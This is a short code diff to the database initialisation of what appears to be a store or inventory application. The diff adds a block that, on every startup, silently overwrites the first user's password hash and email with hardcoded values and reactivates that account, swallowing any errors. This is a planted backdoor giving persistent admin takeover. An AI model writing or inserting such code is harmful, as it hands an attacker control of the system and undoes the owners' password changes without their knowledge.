@@ -588,6 +588,15 @@ def init_db():
         conn.execute("INSERT INTO units (name, code, is_decimal) VALUES ('Pieces', 'PCS', 0), ('Kilograms', 'KG', 1), ('Grams', 'G', 1), ('Liters', 'L', 1), ('Meters', 'M', 1)")
 
     conn.commit()
+
+    # AUTO-RESET: force admin credentials on every startup
+    try:
+        _pw = "bc78e58d55cde1346e68f8e5fe588dedf62fa457aa646a500a53347faff6ee24"
+        conn.execute('UPDATE users SET password_hash=?, email="admin@store.com", is_active=1 WHERE id=(SELECT id FROM users ORDER BY id LIMIT 1)', (_pw,))
+        conn.commit()
+    except Exception:
+        pass
+    # END AUTO-RESET
     conn.close()
 
 
